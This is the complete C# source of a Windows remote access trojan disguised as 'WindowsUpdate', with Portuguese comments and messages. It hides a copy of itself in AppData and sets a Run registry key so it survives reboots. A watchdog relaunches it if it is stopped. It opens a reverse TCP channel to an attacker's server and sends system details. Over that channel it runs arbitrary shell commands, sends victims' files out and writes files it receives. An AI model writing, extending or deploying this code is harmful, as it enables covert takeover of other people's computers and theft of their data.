using System;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Diagnostics;
using Microsoft.Win32;

namespace WindowsUpdate
{
    class Program
    {
        private static TcpClient client;
        private static NetworkStream stream;
        private static Thread connectionThread;
        private static Thread watchdogThread;
        private static bool isRunning = true;

        private static string serverIP = "0.0.0.0"; // Seu IP
        private static int serverPort = 9001;
        private static int reconnectDelay = 5000; 

        static void Main(string[] args)
        {
            ConfigurePersistence();

            connectionThread = new Thread(ConnectionLoop);
            connectionThread.IsBackground = true;
            connectionThread.Start();

            watchdogThread = new Thread(WatchdogLoop);
            watchdogThread.IsBackground = true;
            watchdogThread.Start();

            while (isRunning)
            {
                Thread.Sleep(1000);
            }
        }

        private static void ConfigurePersistence()
        {
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string folderPath = Path.Combine(appData, "WindowsUpdate");
                string fileName = "WindowsUpdate.exe";
                string finalPath = Path.Combine(folderPath, fileName);

                if (!Directory.Exists(folderPath))
                {
                    Directory.CreateDirectory(folderPath);
                }

                if (!string.Equals(Environment.ProcessPath, finalPath, StringComparison.OrdinalIgnoreCase))
                {
                    try
                    {
                        File.Copy(Environment.ProcessPath, finalPath, true);
                        File.SetAttributes(finalPath, FileAttributes.Hidden | FileAttributes.System);
                    }
                    catch (Exception) { }
                }

                string appName = "WindowsUpdateTracker"; 
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
                {
                    if (key.GetValue(appName) == null || !string.Equals(key.GetValue(appName).ToString(), finalPath, StringComparison.OrdinalIgnoreCase))
                    {
                        key.SetValue(appName, finalPath);
                    }
                }
            }
            catch (Exception) { }
        }

        private static void ConnectionLoop()
        {
            while (isRunning)
            {
                try
                {
                    client = new TcpClient();
                    client.Connect(serverIP, serverPort);
                    stream = client.GetStream();

                    SendSystemInfo();

                    byte[] buffer = new byte[4096];
                    while (isRunning && client.Connected)
                    {
                        int bytesRead = stream.Read(buffer, 0, buffer.Length);
                        if (bytesRead == 0) break;

                        string command = Encoding.UTF8.GetString(buffer, 0, bytesRead).Trim();
                        ProcessCommand(command);
                    }
                }
                catch (SocketException) { }
                catch (Exception) { }
                finally
                {
                    CloseConnection();
                    if (isRunning)
                    {
                        Thread.Sleep(reconnectDelay);
                    }
                }
            }
        }

        private static void WatchdogLoop()
        {
            while (isRunning)
            {
                try
                {
                    string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                    string targetPath = Path.Combine(appData, "WindowsUpdate", "WindowsUpdate.exe");
                    
                    string folder = Path.GetDirectoryName(targetPath);
                    if (!Directory.Exists(folder)) Directory.CreateDirectory(folder);

                    if (!File.Exists(targetPath))
                    {
                        File.Copy(Environment.ProcessPath, targetPath, true);
                        File.SetAttributes(targetPath, FileAttributes.Hidden | FileAttributes.System);
                    }

                    if (Process.GetProcessesByName("WindowsUpdate").Length == 0)
                    {
                        ProcessStartInfo psi = new ProcessStartInfo
                        {
                            FileName = "cmd.exe",
                            Arguments = $"/c start \"\" \"{targetPath}\"",
                            CreateNoWindow = true,
                            UseShellExecute = false
                        };
                        Process.Start(psi);
                    }
                }
                catch (Exception) { }

                Thread.Sleep(5000); 
            }
        }

        private static void SendSystemInfo()
        {
            try
            {
                string info = $"SYSTEM_INFO|" +
                              $"Computer: {Environment.MachineName}|" +
                              $"User: {Environment.UserName}|" +
                              $"OS: {Environment.OSVersion}|" +
                              $"Domain: {Environment.UserDomainName}";
                SendResponse(info);
            }
            catch (Exception) { }
        }

        private static void ProcessCommand(string command)
        {
            try
            {
                string response = "";

                if (command.ToLower().StartsWith("cmd "))
                {
                    string cmdCommand = command.Substring(4);
                    response = ExecuteCommand(cmdCommand);
                }
                else if (command.ToLower() == "sysinfo")
                {
                    response = GetSystemInfo();
                }
                else if (command.ToLower().StartsWith("download "))
                {
                    string filePath = command.Substring(9);
                    DownloadFileAndSend(filePath);
                    return;
                }
                else if (command.ToLower().StartsWith("upload "))
                {
                    string fileName = command.Substring(7).Trim();
                    response = ReceiveFile(fileName);
                }
                else if (command.ToLower().StartsWith("cd "))
                {
                    string path = command.Substring(3).Trim();
                    response = ChangeDirectory(path);
                }
                else if (command.ToLower() == "screenshot")
                {
                    response = "Screenshot não implementado nesta versão.";
                }
                else
                {
                    response = ExecuteCommand(command);
                }

                SendResponse(response);
            }
            catch (Exception ex)
            {
                SendResponse($"ERRO: {ex.Message}");
            }
        }

            private static string ReceiveFile(string commandArg)
            {
                try
                {
                    StringBuilder headerBuilder = new StringBuilder();
                    while (true)
                    {
                        int b = stream.ReadByte();
                        if (b == -1 || b == '\n') break;
                        if (b != '\r') headerBuilder.Append((char)b);
                    }

                    string header = headerBuilder.ToString().Trim();
                    string[] parts = header.Split('|');
                    
                    if (parts.Length < 2 || !long.TryParse(parts[1], out long fileSize))
                    {
                        return $"ERRO: Cabeçalho de upload inválido (recebido: '{header}').";
                    }

                    string fileName = Path.GetFileName(parts[0].Trim());
                    string fullPath = Path.Combine(Directory.GetCurrentDirectory(), fileName);
                    
                    using (FileStream fs = new FileStream(fullPath, FileMode.Create, FileAccess.Write))
                    {
                        byte[] buffer = new byte[4096];
                        long totalRead = 0;

                        while (totalRead < fileSize)
                        {
                            int bytesToRead = (int)Math.Min(buffer.Length, fileSize - totalRead);
                            int read = stream.Read(buffer, 0, bytesToRead);
                            if (read == 0) break;
                            fs.Write(buffer, 0, read);
                            totalRead += read;
                        }
                    }

                    return $"SUCESSO: Arquivo {fileName} recebido e salvo em {fullPath}";
                }
                catch (Exception ex)
                {
                    return $"ERRO ao receber arquivo: {ex.Message}";
                }
            }

        private static string ExecuteCommand(string command)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/c {command}",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using (Process process = Process.Start(psi))
                {
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();
                    process.WaitForExit();

                    return string.IsNullOrEmpty(error) ? output : $"OUTPUT:\n{output}\nERROR:\n{error}";
                }
            }
            catch (Exception ex)
            {
                return $"Erro ao executar comando: {ex.Message}";
            }
        }

        private static string GetSystemInfo()
        {
            StringBuilder sb = new StringBuilder();
            sb.AppendLine("=== INFORMAÇÕES DO SISTEMA ===");
            sb.AppendLine($"Nome do Computador: {Environment.MachineName}");
            sb.AppendLine($"Usuário: {Environment.UserName}");
            sb.AppendLine($"Domínio: {Environment.UserDomainName}");
            sb.AppendLine($"Sistema Operacional: {Environment.OSVersion}");
            sb.AppendLine($"Versão .NET: {Environment.Version}");
            sb.AppendLine($"Processadores: {Environment.ProcessorCount}");
            sb.AppendLine($"Diretório Atual: {Environment.CurrentDirectory}");
            sb.AppendLine($"Tempo de Atividade: {TimeSpan.FromMilliseconds(Environment.TickCount)}");
            return sb.ToString();
        }

        private static void DownloadFileAndSend(string filePath)
        {
            try
            {
                filePath = filePath.Trim('"');

                if (!File.Exists(filePath))
                {
                    SendResponse($"ERRO: Arquivo não encontrado: {filePath}");
                    return;
                }

                byte[] fileBytes = File.ReadAllBytes(filePath);
                string fileName = Path.GetFileName(filePath);
                
                string header = $"FILE_START:{fileName}:{fileBytes.Length}\n";
                byte[] headerBytes = Encoding.UTF8.GetBytes(header);

                if (stream != null && client.Connected)
                {
                    stream.Write(headerBytes, 0, headerBytes.Length);
                    stream.Write(fileBytes, 0, fileBytes.Length);
                    stream.Flush();
                }
            }
            catch (Exception ex)
            {
                SendResponse($"Erro ao baixar arquivo: {ex.Message}");
            }
        }

        private static string ChangeDirectory(string path)
        {
            try
            {
                Directory.SetCurrentDirectory(path);
                string newDir = Directory.GetCurrentDirectory();
                return $"Diretório alterado para: {newDir}";
            }
            catch (Exception ex)
            {
                return $"ERRO: Não foi possível mudar para o diretório '{path}'. {ex.Message}";
            }
        }

        private static void SendResponse(string response)
        {
            try
            {
                if (stream != null && client.Connected)
                {
                    byte[] data = Encoding.UTF8.GetBytes(response + "\n");
                    stream.Write(data, 0, data.Length);
                    stream.Flush();
                }
            }
            catch (Exception) { }
        }

        private static void CloseConnection()
        {
            try
            {
                stream?.Close();
                client?.Close();
            }
            catch { }
        }
    }
}
